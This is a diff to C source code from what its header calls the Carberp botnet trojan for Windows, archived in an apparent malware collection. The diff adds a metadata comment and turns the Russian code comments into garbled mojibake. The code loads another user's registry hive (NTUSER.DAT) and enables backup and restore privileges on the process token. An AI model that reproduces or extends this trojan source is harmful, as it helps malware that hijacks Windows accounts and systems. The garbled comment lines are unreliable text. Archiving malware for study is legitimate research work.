@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #define WINVER 0x0500
 #define _WIN32_WINNT 0x0500
 #define WINADVAPI
@@ -75,12 +86,12 @@ int FileIsExists( const char* nameFile )
 int LoadOtherUserReg( const char* sid, const char* domain )
 {
  char path[MAX_PATH];
- SHGetFolderPath( 0, CSIDL_PROFILE,  0, 0, path ); //путь к текущему пользовтелю
- //убираем текущего юзера, добавляем нужного и имя файла его реестра
+ SHGetFolderPath( 0, CSIDL_PROFILE,  0, 0, path ); //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+ //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
  PathRemoveFileSpec(path);
  PathAppend( path, NAME_USER );
  PathAppend( path, "NTUSER.DAT" );
- if( FileIsExists(path) == 0 ) { //пользовательского профиля нет, создаем
+ if( FileIsExists(path) == 0 ) { //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
    HANDLE token, currToken;
    if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currToken ) ) {
      LUID luidRestore, luidBackup;
